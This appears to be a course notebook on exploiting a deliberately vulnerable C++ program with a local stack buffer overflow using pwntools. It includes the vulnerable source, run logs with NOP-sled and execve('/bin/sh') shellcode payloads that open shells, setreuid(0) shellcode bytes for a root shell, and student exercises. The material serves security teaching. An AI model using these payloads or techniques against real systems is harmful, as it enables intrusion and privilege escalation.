# Python exploit code

- Python is a popular language among security professionals
- there are a lot of third-party libraries, frameworks and software created for security-related tasks (CTF, pen-testing, vulnerabiliy scanning, etc.) using Python
- we'll use pwntools library - [https://github.com/Gallopsled/pwntools#readme](https://github.com/Gallopsled/pwntools#readme) for generating the exploit code template and exploiting our vulnerable target program
- make sure pwntools is installed on your system
- be familiar with the basics of pwntools framework using this notebook - [Pwntools Tutorials](./PwntoolsTutorials.ipynb)
- we'll exploit `so_stdio.cpp` program in `demos/stack_overflow` folder


```python
! pwd
```

    /home/kali/Sp25/SoftwareSecurity/notebooks



```python
%cd ../demos
```

    /home/kali/Sp25/SoftwareSecurity/demos



```python
! cat ./stack_overflow/so_stdio.cpp
```

    #include <stdio.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <iostream>
    using namespace std;
    
    #define BUFSIZE 128
    
    using namespace std;
    
    void give_shell(){
        system("/bin/sh");
    }
    
    char * mgets(char *dst) {
        char *ptr = dst;
        int ch; 
    	/* skip leading white spaces */ 
        while ((ch = getchar()) && (ch == ' ' or ch == '\t') )
            ; 
    
        if ((ch == '\n') or (ch == EOF)) { 
            *ptr = '\0';
            return dst; 
        } 
        else
            *ptr = ch;
    
        /* now read the rest until \n or EOF */ 
        while (true) {
            ch = getchar();
            if (ch == '\n' or ch == EOF) break;
            *(++ptr) = ch; 
        }
        *(++ptr) = 0;
        return dst;
    }
    
    void bad() {
        char buffer[BUFSIZE];
        printf("buffer is at %p\n", buffer);
        cout << "Give me some text: ";
        fflush(stdout);
        mgets(buffer); // similar to C's gets;
        //gets(buffer); // depricated
        cout << "Acknowledged: " << buffer << " with length " << strlen(buffer) << endl;
    }
    
    int main(int argc, char *argv[]) {
        bad();
        cout << "Good bye!\n";
        return 0;
    }



```bash
%%bash
# compile the target program
input="./stack_overflow/so_stdio.cpp"
output="./stack_overflow/so_stdio.exe"
echo kali | sudo -S ./compile.sh $input $output
```

    /proc/sys/kernel/randomize_va_space
    0


    [sudo] password for kali: ./stack_overflow/so_stdio.cpp: In function ‘char* mgets(char*)’:
    ./stack_overflow/so_stdio.cpp:29:16: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]
       29 |         *ptr = ch;
          |                ^~
    ./stack_overflow/so_stdio.cpp:35:20: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]
       35 |         *(++ptr) = ch;
          |                    ^~
    ./stack_overflow/so_stdio.cpp: In function ‘int main(int, char**)’:
    ./stack_overflow/so_stdio.cpp:51:14: warning: unused parameter ‘argc’ [-Wunused-parameter]
       51 | int main(int argc, char *argv[]) {
          |          ~~~~^~~~
    ./stack_overflow/so_stdio.cpp:51:26: warning: unused parameter ‘argv’ [-Wunused-parameter]
       51 | int main(int argc, char *argv[]) {
          |                    ~~~~~~^~~~~~



```python
! python -c 'print("Hello World")' | ./stack_overflow/so_stdio.exe
```

    buffer is at 0xffffbca0
    Give me some text: Acknowledged: Hello World with length 11
    Good bye!



```python
! python -c 'print("A"*150)' | ./stack_overflow/so_stdio.exe
```

    buffer is at 0xffffbca0
    Give me some text: Acknowledged: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA with length 150


- armed with this knowledge, let's see how to create a template and complete the exploit code using **pwntools**
- the goal is to force the target program to execute **give_shell()**

### Force the target program to execute give_shell( )
- left as an exercise

#### steps provided as hint
1. creae a template
2. find the offset required to overwrite the caller's return address
3. find the address of **give_shell()**
4. send some junk and the controlled address to execute **give_shell()**

## Send payload containing shellcode

- pwntools provides built-in functionalities to create payload with shellcode of choice and send it to the target program locally or remotely

- let's demonstrate the exploition of demos/stack_overflow/so_stdio.cpp with pwntools


```python
! cat ./stack_overflow/so_stdio.cpp
```

    #include <stdio.h>
    #include <string.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <iostream>
    using namespace std;
    
    #define BUFSIZE 128
    
    using namespace std;
    
    void give_shell(){
        system("/bin/sh");
    }
    
    char * mgets(char *dst) {
        char *ptr = dst;
        int ch; 
    	/* skip leading white spaces */ 
        while ((ch = getchar()) && (ch == ' ' or ch == '\t') )
            ; 
    
        if ((ch == '\n') or (ch == EOF)) { 
            *ptr = '\0';
            return dst; 
        } 
        else
            *ptr = ch;
    
        /* now read the rest until \n or EOF */ 
        while (true) {
            ch = getchar();
            if (ch == '\n' or ch == EOF) break;
            *(++ptr) = ch; 
        }
        *(++ptr) = 0;
        return dst;
    }
    
    void bad() {
        char buffer[BUFSIZE];
        printf("buffer is at %p\n", buffer);
        cout << "Give me some text: ";
        fflush(stdout);
        mgets(buffer); // similar to C's gets;
        //gets(buffer); // depricated
        cout << "Acknowledged: " << buffer << " with length " << strlen(buffer) << endl;
    }
    
    int main(int argc, char *argv[]) {
        bad();
        cout << "Good bye!\n";
        return 0;
    }



```bash
%%bash
input="./stack_overflow/so_stdio.cpp"
output="./stack_overflow/so_stdio.exe"
echo kali | sudo -S ./compile.sh $input $output
ls -al $output
```

    [sudo] password for kali: ./stack_overflow/so_stdio.cpp: In function ‘char* mgets(char*)’:
    ./stack_overflow/so_stdio.cpp:29:16: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]
       29 |         *ptr = ch;
          |                ^~
    ./stack_overflow/so_stdio.cpp:35:20: warning: conversion from ‘int’ to ‘char’ may change value [-Wconversion]
       35 |         *(++ptr) = ch;
          |                    ^~
    ./stack_overflow/so_stdio.cpp: In function ‘int main(int, char**)’:
    ./stack_overflow/so_stdio.cpp:51:14: warning: unused parameter ‘argc’ [-Wunused-parameter]
       51 | int main(int argc, char *argv[]) {
          |          ~~~~^~~~
    ./stack_overflow/so_stdio.cpp:51:26: warning: unused parameter ‘argv’ [-Wunused-parameter]
       51 | int main(int argc, char *argv[]) {
          |                    ~~~~~~^~~~~~


    -rwxr-xr-x 1 root root 31964 Mar 10 16:48 ./stack_overflow/so_stdio.exe


- let's play with the program to learn what it does and how it works...

```bash
┌──(kali㉿K)-[~/EthicalHacking]
└─$ cd demos/stack_overflow 

┌──(kali㉿K)-[~/EthicalHacking/demos/stack_overflow]
└─$ ./so_stdio.exe
buffer is at 0xffffc320
Give me some text: read this?
Acknowledged: read this? with length 10
Good bye!

```

- find the offset using pwntools `cyclic` and `cyclic_find` API
- Python script: demos/stack_overflow/find_offset.py does this for us
- base address of buffer is conviniently printed for us; we can parse it in exploit code
- we'll use the binary shellcode we've genereated from PEDA found in `shellcode/x-86-linux-sh.py` file
- the final exploit code looks like the following


```python
! cat demos/stack_overflow/so_stdio_exploit.py
```

- next is to just run the so_stdio_exploit.py from terminal where the target program and the exploit code reside
- we'll get a shell!

```bash
┌──(kali㉿)-[~/EthicalHacking/demos/stack_overflow]
└─$ python so_stdio_exploit.py 
[*] '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process './so_stdio.exe': pid 19331
[+] Starting local process '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe': pid 19333
[*] Process '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe' stopped with exit code -11 (SIGSEGV) (pid 19333)
[+] Parsing corefile...: Done
[*] '/home/kali/EthicalHacking/demos/stack_overflow/core.19333'
    Arch:      i386-32-little
    EIP:       0x61616161
    ESP:       0xffffc1d0
    Exe:       '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe' (0x8049000)
    Fault:     0x61616161
offset = 144
[+] Starting local process '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe': pid 19336
b'Give me some text: Acknowledged: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0Ph//shh/bin\x89\xe31\xc9\x89\xcaj\x0bX\xcd\x80@\xc1\xff\xff@\xc1\xff\xff@\xc1\xff\xff@\xc1\xff\xff@\xc1\xff\xff with length 144\n'
[*] Switching to interactive mode
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer)
$ date
Sat Dec 19 11:43:44 MST 2020
$ exit
```

## Automatically determining buffer address

- in real world, buffer address will not be printed!
- one can determine the buffer address using ESP
- PEDA provides offset for ESP which is the payload length to completely overwrite EIP or return address
- the offset to ESP can be automatically determined using pwntools's `cylic_find` API
- let's look at the modified program where the line printing the buffer address is commented out
- also the BUFSIZE is changed to 200


```python
! cat demos/stack_overflow/so_stdio_no_add.cpp
```

### Compile the program


```bash
%%bash
# compile the target program
input="./demos/stack_overflow/so_stdio_no_add.cpp"
output="./demos/stack_overflow/so_stdio_no_add.exe"
echo kali | sudo -S ./compile.sh $input $output
```

    [sudo] password for kali: 

## Generate and run the exploit code


```python
! cat ./demos/stack_overflow/so_stdio_no_add_exploit.py
```

- execute the exploitcode from a terminal and get the shell!

```bash
──(kali㉿K)-[~/Sp22/SystemSecurity/demos/stack_overflow]
└─$ python so_stdio_no_add_exploit.py
[*] '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe': pid 739836
[*] Process '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe' stopped with exit code -11 (SIGSEGV) (pid 739836)
[+] Parsing corefile...: Done
[*] '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/core.739836'
    Arch:      i386-32-little
    EIP:       0x63616164
    ESP:       0xffffc280
    Exe:       '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe' (0x8048000)
    Fault:     0x63616164
payload_len = 216
ESP is at ffffc280
EIP contains 63616164
[+] Starting local process '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe': pid 739839
buffer address is at: ffffc1a8
[*] Switching to interactive mode
Give me some text: Acknowledged: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0Ph//shh/bin\x89\xe31\xc9\x89\xcaj\x0b\xa8\xc1\xff\xff\xa8\xc1\xff\xff\xa8\xc1\xff\xff\xa8\xc1\xff\xff\xa8\xc1\xff\xff with length 216
$ whoami
kali
$ exit
[*] Got EOF while reading in interactive
$ 
```

## Getting root shellcode

- user shellcode gives your root shell if you create a soft link /bin/sh pointing to /bin/zsh
- use the root shellcode provided in the shellcode folder
- can also create setuid binary using pwntools and prepend it to the regular user shell
- make sure target program is root owned 
- set seteuid of the target program
- generate setuid binary using pwntools's shellcraft
- prepend the bytes generated to the user root shell

```bash
(base) ┌──(kali㉿kali)-[~/Sp23/SoftwareSecurity/demos/stack_overflow]
└─$ shellcraft -f d i386.linux.setreuid 0
\x31\xdb\x6a\x46\x58\x89\xd9\xcd\x80
```
- change the core pattern to make sure core.%p is the pattern

```bash
echo kali | sudo -S sysctl -w kernel.core_pattern=core.%p
```
- set ulimit to unlimited


### coredump of setuid programs
- must run the exploit_code with sudo to read the coredump of setuid programs

- run the exploit code as root

```bash
sudo python so_stdio_no_add_exploit.py
```

## Challenge

1. Create Python exploit code to get a root shell (instead of the user shell)
    - Hint - create a template similar to the demo
    - automatically find the controlled return address
    - test to make sure the exploit code works



```python

```
